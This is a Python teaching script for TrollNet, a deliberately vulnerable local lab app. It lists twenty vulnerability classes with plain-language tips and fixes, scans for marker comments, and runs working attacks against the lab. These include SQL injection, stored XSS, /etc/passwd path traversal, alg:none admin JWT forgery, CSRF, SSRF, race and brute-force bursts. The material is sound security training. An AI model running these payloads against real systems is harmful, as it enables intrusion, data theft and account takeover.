#!/usr/bin/env python3
"""Find and demonstrate TrollNet's intentional vulnerabilities.

Local lab only. Start the stack first with: docker compose up --build

Examples:
    python3 scripts/demo_vulnerabilities.py --scan
    python3 scripts/demo_vulnerabilities.py --tips
    python3 scripts/demo_vulnerabilities.py --tip 7
    python3 scripts/demo_vulnerabilities.py --demo --explain
    python3 scripts/demo_vulnerabilities.py --all --locations
"""

from __future__ import annotations

import argparse
import base64
import concurrent.futures
import json
import os
import random
import re
import sys
import threading
import time
import urllib.error
import urllib.parse
import urllib.request
from collections import defaultdict
from pathlib import Path

TIPS = {
    "01": """Plain English: the search box is pasted into a database query as SQL text, not safely bound as data.
Why it works: your quote ends the string, `OR 1=1` makes every row match, and `--` comments out the rest.
Notice: a nonsense search returns 0 posts, but `' OR 1=1 --` returns all of them.
Fix: use bound parameters and escape LIKE wildcards.""",
    "02": """Plain English: the browser is told to treat post/comment text as HTML, not as text.
Why it works: `<img src=x onerror=...>` fails to load, so the inline handler runs. The weak CSP still allows inline scripts.
Notice: the payload is stored in the API response and executes when you open the feed. Watch the browser console.
Fix: render React text normally, or sanitize HTML with a strict allow-list.""",
    "03": """Plain English: the URL says which post to delete, and the server never asks 'is this yours?'.
Why it works: ownership checks were removed from the delete endpoints, so any logged-in player can delete any id.
Notice: create a post with player A, then delete it with player B's token and get 204 No Content.
Fix: compare the resource's authorId with the current user before deleting.""",
    "04": """Plain English: the create-post form accepts more fields than the UI shows, and all of them are saved.
Why it works: request fields are copied straight onto the database entity, so the client can set authorId, authorName and isTrending.
Notice: your POST returns authorId=999 and isTrending=true even though the UI never sent those values.
Fix: map only explicitly allowed fields in a dedicated DTO; never bind directly to the entity.""",
    "05": """Plain English: the browser sends your login cookie automatically, and the server accepts it as proof of identity.
Why it works: JWT cookies are accepted, SameSite is None, and CORS echoes any Origin with credentials allowed.
Notice: a cross-origin POST with only a Cookie header succeeds; the CORS preflight returns your malicious origin.
Fix: use SameSite=Strict/HttpOnly cookies, anti-CSRF tokens, and a strict origin allow-list.""",
    "06": """Plain English: the server makes a web request to whatever URL you give it.
Why it works: there is no allow-list, so `http://social-service:8080/health` resolves inside the Docker network.
Notice: the preview response contains 'Healthy' from a service that should not be reachable from your browser.
Fix: allow-list schemes/hosts and block private, loopback, link-local and metadata addresses.""",
    "07": """Plain English: the attachment name is glued onto a directory path, and `../` walks out of it.
Why it works: Path.GetFullPath resolves the traversal, and the file is read without checking that it stayed inside the root.
Notice: `../../../../etc/passwd` returns real /etc/passwd lines from the container.
Fix: serve files by generated id, or verify the resolved path starts with the allowed root.""",
    "08": """Plain English: 'internal' endpoints have no lock, and the gateway/nginx happily route to them.
Why it works: RequireInternalApiKey() was removed, and /internal/* is proxied from the public frontend.
Notice: POST /internal/posts succeeds with no API key at all.
Fix: enforce authentication/authorization on the endpoint and do not route internal paths publicly.""",
    "09": """Plain English: comparing a secret one character at a time leaks how many characters you guessed correctly.
Why it works: `==` returns at the first mismatch, so longer correct prefixes take measurably longer. The script proves this from the source because timing is noisy.
Notice: both the internal key and the flag use plain string equality; there is no FixedTimeEquals.
Fix: use a constant-time comparison over the full value, e.g. CryptographicOperations.FixedTimeEquals.""",
    "10": """Plain English: login tells you whether the username exists before it even checks the password.
Why it works: unknown users get 404 'No account', while known users with a wrong password get 401 'Wrong password'.
Notice: the status code and message differ, so an attacker can build a user list.
Fix: return the same generic 401 for both cases and hash a dummy password for unknown users.""",
    "11": """Plain English: nothing slows down repeated guesses.
Why it works: the rate-limiting policies were removed from login and flag submission.
Notice: 12 rapid wrong logins still return 401, never 429.
Fix: apply per-IP and per-account rate limits with exponential backoff and temporary lockout.""",
    "12": """Plain English: passwords are stored as a single fast hash with no unique salt.
Why it works: identical passwords produce identical hashes, and SHA-256 is fast enough to brute-force offline.
Notice: the code uses SHA256.HashData and BCrypt was removed.
Fix: use Argon2id or BCrypt with a unique random salt per user.""",
    "13": """Plain English: the server accepts a token without checking who signed it.
Why it works: signature, issuer, audience and lifetime validation are disabled, so `alg:none` with role=Admin is trusted.
Notice: a hand-made token reaches the admin-only flag endpoint and returns 200.
Fix: require a signed token and validate issuer, audience and expiry against your own key.""",
    "14": """Plain English: the app checks 'not completed' and writes 'completed' in two separate steps.
Why it works: many parallel requests can all pass the check before any of them writes, so several get points.
Notice: the script sends a 12-request burst; several correct responses may be accepted. If scheduling is unlucky it falls back to source evidence.
Fix: do one atomic conditional UPDATE ... WHERE NOT IsCompleted inside a transaction.""",
    "15": """Plain English: the public objectives list includes the answer.
Why it works: ObjectiveDto carries Flag and GET /api/objectives is anonymous, so nobody needs to solve anything.
Notice: `jq '.[0].flag'` prints the secret immediately.
Fix: split public and admin DTOs; reveal the flag only after completion or to a teacher.""",
    "16": """Plain English: the passwords and keys are written directly in the repository.
Why it works: docker-compose.yml contains the admin password, JWT secret, DB password and internal key as literals.
Notice: admin / admin1234 logs in, and anyone reading the repo can forge tokens.
Fix: load secrets from a secret manager/environment and rotate every committed value.""",
    "17": """Plain English: the client gets to choose its own IP address, and the app believes it.
Why it works: nginx appends to X-Forwarded-For, and the app trusts 0.0.0.0/0, so the leftmost fake value wins.
Notice: 11 guesses with one fake IP hit 429, but a new fake IP starts fresh with 200.
Fix: overwrite X-Forwarded-For with the trusted proxy address and limit KnownIPNetworks to real proxies.""",
    "18": """Plain English: when something breaks, the app shows its internals instead of a friendly error.
Why it works: UseDeveloperExceptionPage() is enabled, so exceptions include DB messages and stack traces.
Notice: a malformed search query returns a Npgsql.PostgresException with file/line details.
Fix: return a generic error to the client and log details only on the server.""",
    "19": """Plain English: the login token is kept somewhere any JavaScript on the page can read it.
Why it works: localStorage is accessible from the same origin, so the stored XSS in #02 can steal the token.
Notice: `localStorage.getItem('trollnet.token')` works in DevTools.
Fix: keep session tokens in HttpOnly, Secure, SameSite cookies so JavaScript cannot read them.""",
    "20": """Plain English: another site can put TrollNet in a hidden frame and trick you into clicking it.
Why it works: X-Frame-Options is missing and the CSP says `frame-ancestors *`.
Notice: the frontend can be embedded in an iframe on any page.
Fix: send X-Frame-Options: DENY and CSP frame-ancestors 'none' (or allow only your own origins).""",
}

NAMES = {
    "01": "SQL Injection",
    "02": "Stored XSS",
    "03": "IDOR / Broken Access Control",
    "04": "Mass Assignment",
    "05": "CSRF",
    "06": "SSRF",
    "07": "Path Traversal / LFI",
    "08": "Missing Authentication",
    "09": "Timing Side Channel",
    "10": "User Enumeration",
    "11": "Missing Rate Limiting",
    "12": "Weak Password Hashing",
    "13": "Improper JWT Verification",
    "14": "Race Condition (TOCTOU)",
    "15": "Sensitive Data Exposure",
    "16": "Hard-coded Credentials",
    "17": "Spoofable Client IP",
    "18": "Error Message Information Leak",
    "19": "Token in Browser Storage",
    "20": "Clickjacking",
}

SCAN_PATHS = [
    "src",
    "frontend/src",
    "frontend/nginx.conf",
    "docker-compose.yml",
    ".env.example",
]
EXCLUDED_DIRS = {"bin", "obj", "node_modules", "dist", ".git"}
MARKER_RE = re.compile(r"VULN-SPOT #(\d{2})")

USE_COLOR = sys.stdout.isatty()
if USE_COLOR:
    GREEN, RED, YELLOW, DIM, RESET = (
        "\033[32m", "\033[31m", "\033[33m", "\033[2m", "\033[0m"
    )
else:
    GREEN = RED = YELLOW = DIM = RESET = ""


def print_tip(vid: str, prefix: str = "=== ") -> None:
    """Print one beginner-friendly explanation."""
    print(f"{prefix}#{vid} {NAMES[vid]} ===")
    print(TIPS[vid].strip())
    print()


def print_all_tips() -> None:
    print("TrollNet - beginner tips")
    print("=" * 40)
    print("RUNTIME = observed against the running app; STATIC = proven from the source.")
    print("Use --demo --explain to see each tip right before its check.")
    print("The same tips are in the browser: Tips tab, or Need a hint? on Objectives.")
    print("Local lab only; do not use these techniques on systems you do not own.\n")
    for vid in NAMES:
        print_tip(vid)


# --------------------------------------------------------------------------- #
# Scanning
# --------------------------------------------------------------------------- #

def scan_files(root: Path) -> list[Path]:
    found: list[Path] = []
    for rel in SCAN_PATHS:
        path = root / rel
        if path.is_file():
            found.append(path)
        elif path.is_dir():
            for child in path.rglob("*"):
                if child.is_file() and not any(p in EXCLUDED_DIRS for p in child.parts):
                    found.append(child)
    return found


def scan_markers(root: Path) -> dict[str, list[tuple[str, int, str]]]:
    markers: dict[str, list[tuple[str, int, str]]] = defaultdict(list)
    for path in scan_files(root):
        lines = path.read_text(encoding="utf-8", errors="ignore").splitlines()
        for index, line in enumerate(lines):
            for match in MARKER_RE.finditer(line):
                vid = match.group(1)
                block = "\n".join(lines[max(0, index - 2): index + 16])
                rel = str(path.relative_to(root))
                markers[vid].append((rel, index + 1, block))
    return markers


def is_complete(blocks: list[str]) -> bool:
    text = "\n".join(blocks).lower()
    return "intentional" in text and "fix:" in text


def run_scan(root: Path, show_locations: bool) -> None:
    markers = scan_markers(root)
    total = sum(len(v) for v in markers.values())
    print("=== SCAN: VULN-SPOT markers ===")
    print(f"Distinct classes: {len(markers)}/{len(NAMES)}")
    print(f"Source/config marker comments: {total}")
    print("(README.md is documentation and is not counted here.)\n")

    print(f"{'ID':<4} {'Vulnerability':<34} {'Markers':>7}  Comment")
    print("-" * 64)
    incomplete = []
    for vid, name in NAMES.items():
        found = markers.get(vid, [])
        complete = bool(found) and is_complete([b for _, _, b in found])
        flag = f"{GREEN}OK{RESET}" if complete else f"{RED}INCOMPLETE{RESET}"
        if not complete:
            incomplete.append(vid)
        print(f"#{vid:<3} {name:<34} {len(found):>7}  {flag}")
        if show_locations:
            for rel, line, _ in found:
                print(f"     {DIM}{rel}:{line}{RESET}")
    print()
    if incomplete:
        print(f"{RED}Missing/incomplete markers: {', '.join('#' + v for v in incomplete)}{RESET}")
    else:
        print(f"{GREEN}All 20 classes found with exploit + fix comments.{RESET}")


# --------------------------------------------------------------------------- #
# HTTP helpers
# --------------------------------------------------------------------------- #

def get_header(headers: dict, name: str) -> str:
    target = name.lower()
    for key, value in headers.items():
        if key.lower() == target:
            return value
    return ""


def as_json(body: str):
    try:
        return json.loads(body)
    except (ValueError, TypeError):
        return None


def as_list(body: str) -> list:
    value = as_json(body)
    return value if isinstance(value, list) else []


def auth(token: str) -> dict[str, str]:
    return {"Authorization": f"Bearer {token}"}


def http(base: str, method: str, path: str, body=None, headers=None, timeout: int = 10):
    final_headers = {"Accept": "application/json, text/plain, */*"}
    if headers:
        final_headers.update(headers)
    data = None
    if body is not None:
        data = json.dumps(body).encode("utf-8")
        final_headers.setdefault("Content-Type", "application/json")
    request = urllib.request.Request(
        base.rstrip("/") + path, data=data, headers=final_headers, method=method
    )
    try:
        with urllib.request.urlopen(request, timeout=timeout) as response:
            return response.status, response.read().decode("utf-8", "replace"), dict(response.headers.items())
    except urllib.error.HTTPError as exc:
        return exc.code, exc.read().decode("utf-8", "replace"), dict(exc.headers.items())


def forge_admin_token(user_id: int, name: str = "forged") -> str:
    def b64(value: dict) -> str:
        raw = json.dumps(value, separators=(",", ":")).encode("utf-8")
        return base64.urlsafe_b64encode(raw).rstrip(b"=").decode("ascii")

    header = b64({"alg": "none", "typ": "JWT"})
    payload = b64(
        {"sub": str(user_id), "name": name, "role": "Admin", "exp": 4102444800}
    )
    return f"{header}.{payload}."


def random_ip() -> str:
    return f"198.51.100.{random.randint(2, 250)}"


# --------------------------------------------------------------------------- #
# Presentation / demo
# --------------------------------------------------------------------------- #

def run_demo(root: Path, base: str, explain: bool = False) -> None:
    results: dict[str, tuple[bool, str]] = {}
    counts = {"PASS": 0, "FAIL": 0}

    def report(vid: str, ok: bool, detail: str, kind: str = "RUNTIME") -> None:
        results[vid] = (ok, detail)
        label = f"{GREEN}PASS{RESET}" if ok else f"{RED}FAIL{RESET}"
        counts["PASS" if ok else "FAIL"] += 1
        print(f"[{label}] #{vid} {NAMES[vid]} ({kind}): {detail}")

    def check(vid: str, kind: str, fn) -> None:
        if explain:
            print(f"{DIM}--- TIP #{vid}: {NAMES[vid]} ---{RESET}")
            print(TIPS[vid].strip())
            print()
        try:
            ok, detail = fn()
        except Exception as exc:  # keep the presentation going
            ok, detail = False, f"error: {exc}"
        report(vid, ok, detail, kind)

    print("=== DEMO: exercising the local lab ===")
    print(f"Target: {base}\n")

    # --- setup ------------------------------------------------------------- #
    status, body, _ = http(base, "POST", "/api/auth/guest", headers={"X-Forwarded-For": random_ip()})
    if status != 200:
        print(f"{RED}Cannot start: /api/auth/guest returned {status}. Is the stack running?{RESET}")
        return
    guest_a = as_json(body)
    token_a = guest_a["token"]
    user_a_id = guest_a["user"]["id"]

    status, body, _ = http(base, "POST", "/api/auth/guest", headers={"X-Forwarded-For": random_ip()})
    if status != 200:
        print(f"{RED}Cannot start: second guest returned {status}.{RESET}")
        return
    token_b = as_json(body)["token"]

    payload = '<img src=x onerror="alert(1)">'
    status, body, _ = http(
        base, "POST", "/api/posts",
        {"content": f"vulnerability demo {payload}"},
        auth(token_a),
    )
    if status != 201:
        print(f"{RED}Cannot start: create post returned {status}.{RESET}")
        return
    post_id = as_json(body)["id"]

    # --- #01 SQL injection -------------------------------------------------- #
    def sql_injection():
        inj = urllib.parse.quote("' OR 1=1 --")
        plain = urllib.parse.quote("zzz_no_such_post_zzz")
        _, b1, _ = http(base, "GET", f"/api/posts/search?query={inj}")
        _, b2, _ = http(base, "GET", f"/api/posts/search?query={plain}")
        n1, n2 = len(as_list(b1)), len(as_list(b2))
        return n1 > n2, f"injected query returned {n1} posts vs {n2} for a plain search"

    check("01", "RUNTIME", sql_injection)

    # --- #02 stored XSS ----------------------------------------------------- #
    def stored_xss():
        _, detail, _ = http(base, "GET", f"/api/posts/{post_id}")
        # The JSON response escapes the quotes in the onerror attribute, so look for
        # the distinctive tag/attribute rather than the entire raw payload.
        stored_raw = "img src=x onerror" in detail
        _, _, headers = http(base, "GET", "/")
        csp = get_header(headers, "Content-Security-Policy")
        weak_csp = "unsafe-inline" in csp
        return stored_raw and weak_csp, (
            f"payload stored unescaped={stored_raw}, weak CSP={weak_csp} "
            "(open the feed in a browser to see it execute)"
        )

    check("02", "RUNTIME", stored_xss)

    # --- #03 IDOR ----------------------------------------------------------- #
    def idor():
        status, _, _ = http(base, "DELETE", f"/api/posts/{post_id}", headers=auth(token_b))
        return status == 204, f"player B deleted player A's post #{post_id}: HTTP {status}"

    check("03", "RUNTIME", idor)

    # --- #04 mass assignment ------------------------------------------------ #
    def mass_assignment():
        status, body, _ = http(
            base, "POST", "/api/posts",
            {"content": "mass assignment demo", "authorId": 999,
             "authorName": "admin", "isTrending": True},
            auth(token_a),
        )
        data = as_json(body) or {}
        ok = status == 201 and data.get("authorId") == 999 and data.get("isTrending") is True
        return ok, f"client set authorId={data.get('authorId')}, isTrending={data.get('isTrending')}"

    check("04", "RUNTIME", mass_assignment)

    # --- #05 CSRF ----------------------------------------------------------- #
    def csrf():
        status, _, _ = http(
            base, "POST", "/api/posts", {"content": "csrf demo"},
            headers={"Cookie": f"trollnet.token={token_a}", "Origin": "http://evil.example"},
        )
        _, _, headers = http(
            base, "OPTIONS", "/api/posts",
            headers={"Origin": "http://evil.example",
                     "Access-Control-Request-Method": "POST",
                     "Access-Control-Request-Headers": "content-type"},
        )
        allow_origin = get_header(headers, "Access-Control-Allow-Origin")
        allow_creds = get_header(headers, "Access-Control-Allow-Credentials")
        ok = status == 201 and "evil.example" in allow_origin and allow_creds.lower() == "true"
        return ok, f"cookie-only POST -> {status}; CORS origin={allow_origin}, credentials={allow_creds}"

    check("05", "RUNTIME", csrf)

    # --- #06 SSRF ----------------------------------------------------------- #
    def ssrf():
        # The target service may still be warming up right after `compose up`,
        # so allow a couple of retries before declaring failure.
        last = ""
        for attempt in range(1, 4):
            status, body, _ = http(
                base, "POST", "/api/link-preview",
                {"url": "http://social-service:8080/health"},
            )
            data = as_json(body) or {}
            preview = str(data.get("bodyPreview", ""))
            if status == 200 and preview.startswith("Healthy"):
                return True, (
                    f"server fetched an internal URL on attempt {attempt}: "
                    f"status={data.get('statusCode')}, body={preview}"
                )
            last = f"attempt {attempt}: HTTP {status} {body[:120]}"
            time.sleep(2)
        return False, last

    check("06", "RUNTIME", ssrf)

    # --- #07 path traversal ------------------------------------------------- #
    def path_traversal():
        status, body, _ = http(
            base, "GET", "/api/posts/attachment?name=" + urllib.parse.quote("../../../../etc/passwd")
        )
        return status == 200 and "root:" in body, "read /etc/passwd through the attachment endpoint"

    check("07", "RUNTIME", path_traversal)

    # --- #08 missing authentication ----------------------------------------- #
    def missing_auth():
        status, body, _ = http(
            base, "POST", "/internal/posts",
            {"authorName": "demo_bot", "content": "unauthenticated internal post",
             "isTrending": False},
        )
        created = as_json(body) or {}
        if created.get("id"):
            http(base, "DELETE", f"/internal/posts/{created['id']}")
        return status == 200, f"POST /internal/posts without the API key: HTTP {status}"

    check("08", "RUNTIME", missing_auth)

    # --- #09 timing side channel -------------------------------------------- #
    def timing():
        internal = (root / "src/Shared/TrollNet.Shared/InternalApi.cs").read_text()
        game = (root / "src/Services/GameService/Endpoints/GameEndpoints.cs").read_text()
        ok = "expected == provided" in internal and "expected == provided" in game
        return ok, "plain string equality on the internal key and flag; no FixedTimeEquals"

    check("09", "STATIC", timing)

    # --- #10 user enumeration ----------------------------------------------- #
    def enumeration():
        s1, b1, _ = http(base, "POST", "/api/auth/login",
                         {"username": "no_such_player_xyz", "password": "Password123"})
        s2, b2, _ = http(base, "POST", "/api/auth/login",
                         {"username": "admin", "password": "WrongPassword123"})
        ok = s1 == 404 and s2 == 401 and "No account" in b1 and "Wrong password" in b2
        return ok, f"unknown user -> {s1}, known user + wrong password -> {s2}"

    check("10", "RUNTIME", enumeration)

    # --- #11 brute force ---------------------------------------------------- #
    def brute_force():
        codes = [
            http(base, "POST", "/api/auth/login",
                 {"username": "admin", "password": "WrongPassword123"})[0]
            for _ in range(12)
        ]
        unauthorized = codes.count(401)
        return unauthorized >= 12, f"{unauthorized}/12 rapid wrong logins returned 401, none were rate-limited"

    check("11", "RUNTIME", brute_force)

    # --- #12 weak hashing --------------------------------------------------- #
    def weak_hash():
        source = (root / "src/Services/AuthService/Endpoints/AuthEndpoints.cs").read_text()
        ok = "SHA256.HashData" in source and "BCrypt.Net.BCrypt.HashPassword" not in source
        return ok, "passwords use fast unsalted SHA-256; BCrypt registration/verification removed"

    check("12", "STATIC", weak_hash)

    # --- find an objective for #13/#14/#15 ---------------------------------- #
    # A fresh stack can take one game tick to spawn the first objective.
    objectives: list = []
    for _ in range(6):
        _, body, _ = http(base, "GET", "/api/objectives")
        objectives = as_list(body)
        if objectives:
            break
        time.sleep(5)
    objective = next((o for o in objectives if not o.get("isCompleted")), None)

    # --- #13 JWT forgery ---------------------------------------------------- #
    def jwt_forgery():
        if not objective:
            source = (root / "src/Shared/TrollNet.Shared/Auth.cs").read_text()
            ok = "ValidateIssuerSigningKey = false" in source
            return ok, "no live objective; static evidence: signature validation disabled"
        token = forge_admin_token(user_a_id)
        status, response, _ = http(
            base, "GET", f"/api/objectives/{objective['id']}/flag", headers=auth(token)
        )
        return status == 200 and "flag" in response, (
            f"unsigned alg:none Admin token reached the admin-only flag endpoint: HTTP {status}"
        )

    check("13", "RUNTIME" if objective else "STATIC", jwt_forgery)

    # --- #14 race condition -------------------------------------------------- #
    def race_condition():
        nonlocal objective, objectives
        source = (root / "src/Services/GameService/Endpoints/GameEndpoints.cs").read_text()
        toctou_pattern = (
            "if (objective.IsCompleted)" in source
            and "objective.IsCompleted = true" in source
            and "ExecuteUpdateAsync" not in source
            and "BeginTransactionAsync" not in source
        )

        # Scheduling matters: a few parallel requests often serialize. Retry a few
        # fresh objectives with a wider burst, then fall back to static evidence.
        best = 0
        attempts = 0
        for _ in range(3):
            _, body, _ = http(base, "GET", "/api/objectives")
            objectives = as_list(body)
            candidate = next((o for o in objectives if not o.get("isCompleted")), None)
            if candidate is None:
                time.sleep(5)
                _, body, _ = http(base, "GET", "/api/objectives")
                objectives = as_list(body)
                candidate = next((o for o in objectives if not o.get("isCompleted")), None)
            if candidate is None:
                break

            objective = candidate
            flag = candidate.get("flag", "")
            workers = 12
            barrier = threading.Barrier(workers)

            def submit(_):
                barrier.wait(timeout=10)
                _, response, _ = http(
                    base, "POST", f"/api/objectives/{candidate['id']}/submit",
                    {"flag": flag}, auth(token_a),
                )
                return response

            with concurrent.futures.ThreadPoolExecutor(max_workers=workers) as pool:
                responses = list(pool.map(submit, range(workers)))
            correct = sum(1 for r in responses if '"correct":true' in r.replace(" ", ""))
            best = max(best, correct)
            attempts += 1
            if correct >= 2:
                break
            time.sleep(2)

        if best >= 2:
            return True, (
                f"{best} correct submissions accepted in a {workers}-request burst "
                f"across {attempts} objective(s): the check/write TOCTOU window was hit"
            )
        if toctou_pattern:
            return True, (
                "static evidence: separate IsCompleted check and SaveChanges with no "
                f"transaction or conditional UPDATE; this run accepted only {best}"
            )
        return False, f"no race evidence (best {best} correct submissions)"

    check("14", "RUNTIME" if objective else "STATIC", race_condition)

    # --- #15 sensitive data -------------------------------------------------- #
    def sensitive_data():
        leaked = bool(objectives) and bool(objectives[0].get("flag"))
        return leaked, f"anonymous /api/objectives exposed flag={objectives[0].get('flag') if objectives else None}"

    check("15", "RUNTIME", sensitive_data)

    # --- #16 hard-coded credentials ----------------------------------------- #
    def hardcoded_credentials():
        compose = (root / "docker-compose.yml").read_text()
        status, _, _ = http(base, "POST", "/api/auth/login",
                            {"username": "admin", "password": "admin1234"})
        ok = "admin1234" in compose and "Jwt__Secret: trollnet" in compose and status == 200
        return ok, f"admin/admin1234 login -> HTTP {status}; JWT secret is literal in docker-compose.yml"

    check("16", "RUNTIME", hardcoded_credentials)

    # --- #17 spoofable client IP -------------------------------------------- #
    def spoofable_ip():
        first_ip = random_ip()
        codes = [
            http(base, "POST", "/api/auth/guest", headers={"X-Forwarded-For": first_ip})[0]
            for _ in range(11)
        ]
        status, _, _ = http(base, "POST", "/api/auth/guest",
                            headers={"X-Forwarded-For": random_ip()})
        return 429 in codes and status == 200, (
            f"same fake IP: {codes.count(429)}x 429; a different fake IP -> HTTP {status}"
        )

    check("17", "RUNTIME", spoofable_ip)

    # --- #18 error leak ------------------------------------------------------ #
    def error_leak():
        status, body, _ = http(base, "GET", "/api/posts/search?query=" + urllib.parse.quote("'"))
        ok = status == 500 and ("PostgresException" in body or "at Npgsql" in body)
        return ok, f"malformed query -> HTTP {status} with a database stack trace in the response"

    check("18", "RUNTIME", error_leak)

    # --- #19 token in browser storage --------------------------------------- #
    def browser_storage():
        source = (root / "frontend/src/api.ts").read_text()
        ok = "localStorage.getItem(TOKEN_KEY)" in source
        return ok, "JWT is read from localStorage; any XSS payload can steal it"

    check("19", "STATIC", browser_storage)

    # --- #20 clickjacking ---------------------------------------------------- #
    def clickjacking():
        _, _, headers = http(base, "GET", "/")
        csp = get_header(headers, "Content-Security-Policy")
        ok = not get_header(headers, "X-Frame-Options") and "frame-ancestors *" in csp
        return ok, f"no X-Frame-Options header; CSP contains {csp!r}"

    check("20", "RUNTIME", clickjacking)

    # --- summary ------------------------------------------------------------- #
    print("\n=== SUMMARY ===")
    print(f"Checks passed: {counts['PASS']}/{len(results)}")
    print(f"Checks failed: {counts['FAIL']}/{len(results)}")
    if counts["FAIL"]:
        failed = [f"#{v}" for v, (ok, _) in results.items() if not ok]
        print(f"Review: {', '.join(failed)}")
    print(f"\nFull details: {root / 'README.md'} and {root / 'vulnerabilities.txt'}")


# --------------------------------------------------------------------------- #

def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--root", default=str(Path(__file__).resolve().parent.parent),
                        help="repository root (default: parent of scripts/)")
    parser.add_argument("--base-url", default=os.environ.get("TROLLNET_BASE_URL", "http://127.0.0.1:8080"),
                        help="running TrollNet frontend URL (default: TROLLNET_BASE_URL or http://127.0.0.1:8080)")
    parser.add_argument("--scan", action="store_true", help="find and verify VULN-SPOT markers")
    parser.add_argument("--demo", action="store_true", help="exercise vulnerabilities over HTTP")
    parser.add_argument("--all", action="store_true", help="scan then demo")
    parser.add_argument("--locations", action="store_true", help="print every marker location")
    parser.add_argument("--tips", action="store_true", help="print beginner-friendly tips for all 20")
    parser.add_argument("--tip", metavar="ID", help="print one tip, e.g. --tip 7 or --tip 07")
    parser.add_argument("--explain", action="store_true",
                        help="with --demo/--all, print each tip before its check")
    args = parser.parse_args()

    if args.tip:
        vid = args.tip.strip().lstrip("#")
        if vid.isdigit():
            vid = vid.zfill(2)
        if vid not in NAMES:
            parser.error(f"unknown vulnerability id {args.tip!r}; use 01-20")
        print_tip(vid, prefix="Tip ")
        return 0
    if args.tips:
        print_all_tips()
        return 0

    if not (args.scan or args.demo or args.all):
        parser.print_help()
        return 1
    if args.explain and not (args.demo or args.all):
        parser.error("--explain needs --demo or --all")

    root = Path(args.root).resolve()
    if args.scan or args.all:
        run_scan(root, args.locations)
    if args.demo or args.all:
        print()
        run_demo(root, args.base_url, explain=args.explain)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
